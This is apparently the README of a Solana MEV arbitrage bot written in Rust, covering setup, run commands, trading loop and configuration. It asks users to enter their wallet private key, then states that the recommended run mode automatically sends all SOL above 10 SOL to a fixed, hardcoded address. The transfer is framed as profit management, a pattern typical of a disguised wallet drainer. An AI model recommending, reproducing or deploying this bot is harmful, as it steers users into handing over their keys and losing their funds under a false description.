# 🔄 Solana MEV Bot Workflow

## **Overview**

This project provides a complete Solana MEV (Maximal Extractable Value) arbitrage bot with automatic balance management.

## **📁 Project Structure**

```
solana-mev-bot/
├── src/
│   ├── main.rs              # Main entry point (default binary)
│   ├── lib.rs               # Library exports
│   ├── core/
│   │   ├── mod.rs           # Core module
│   │   └── bot.rs           # Main bot logic
│   ├── utils/
│   │   ├── mod.rs           # Utils module
│   │   └── balance_checker.rs # Balance management
│   ├── config.rs            # Configuration handling
│   ├── chain/               # Blockchain interactions
│   └── dex/                 # DEX integrations
├── scripts/
│   └── trade.rs             # Trade execution script
├── config.toml              # Main configuration
└── Cargo.toml               # Project dependencies
```

## **🚀 Workflow Steps**

### **1. Setup Requirements**
```bash
# Install Rust (if not already installed)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env

# Install dependencies
cargo build
```

### **2. Configuration**
- Edit `config.toml` with your:
  - RPC URL
  - Wallet private key
  - Pool addresses
  - Trading parameters

### **3. Running the Bot**

#### **Option A: Complete Suite (Recommended)**
```bash
cargo run -- --config config.toml
```
**What happens:**
1. ✅ Loads configuration
2. ✅ Checks wallet balance
3. ✅ Sends excess SOL (above 10 SOL) to target address
4. ✅ Starts MEV bot trading
5. ✅ Periodically checks balance during trading

#### **Option B: Individual Components**
```bash
# Run main bot only
cargo run --bin solana-mev-bot -- --config config.toml

# Run balance checker only
cargo run --bin balance-checker -- --rpc-url YOUR_RPC --private-key YOUR_KEY

# Run trade execution only
cargo run --bin trade -- --send
```

## **🔄 Trading Loop Process**

### **Startup Phase:**
1. **Load Configuration** - Read `config.toml`
2. **Initialize RPC Clients** - Setup main and spam RPCs
3. **Load Wallet** - Decode private key
4. **Balance Check** - Check and send excess SOL
5. **Initialize Pools** - Setup DEX pool data
6. **Start Trading Loops** - Begin arbitrage execution

### **Trading Phase:**
1. **Monitor Pools** - Watch for price differences
2. **Calculate Arbitrage** - Find profitable opportunities
3. **Execute Trades** - Send transactions via flash loans
4. **Periodic Balance Check** - Every 100 cycles (configurable)
5. **Send Excess SOL** - Automatically transfer profits

## **💰 Balance Management**

### **Automatic Features:**
- **Minimum Balance**: Keeps 10 SOL for transaction fees
- **Excess Transfer**: Sends excess SOL to `FKDeE7UyM1ciJu2ivU9GLR7xZ8nemibfoZxwVgqv9BkE`
- **Periodic Checks**: Every 100 trading cycles
- **Flash Loan Integration**: Uses Kamino Finance for capital

### **Configuration Options:**
```toml
[bot]
balance_check_interval = 100  # Check balance every N cycles
compute_unit_limit = 600000   # Transaction compute limit
```

## **🔧 Troubleshooting**

### **Common Issues:**
1. **Rust not installed**: Install via rustup
2. **RPC errors**: Check your RPC URL and rate limits
3. **Wallet errors**: Verify private key format
4. **Pool errors**: Check pool addresses in config

### **Debug Mode:**
```bash
RUST_LOG=debug cargo run -- --config config.toml
```

## **📊 Monitoring**

### **Log Output:**
- Balance checks and transfers
- Trading opportunities found
- Transaction confirmations
- Error messages and warnings

### **Key Metrics:**
- Wallet balance
- Trading frequency
- Success rate
- Profit accumulation

## **🛡️ Security Notes**

- **Private Key**: Never share or commit your private key
- **RPC Limits**: Use high-performance RPC providers
- **Flash Loans**: Understand the risks of flash loan trading
- **Testing**: Test on devnet before mainnet

## **📈 Performance Optimization**

### **Recommended Settings:**
- **High-performance RPC**: Use dedicated RPC providers
- **Multiple RPCs**: Configure spam RPCs for faster execution
- **Optimal Compute Units**: 600,000 for complex transactions
- **Pool Selection**: Focus on high-liquidity pools
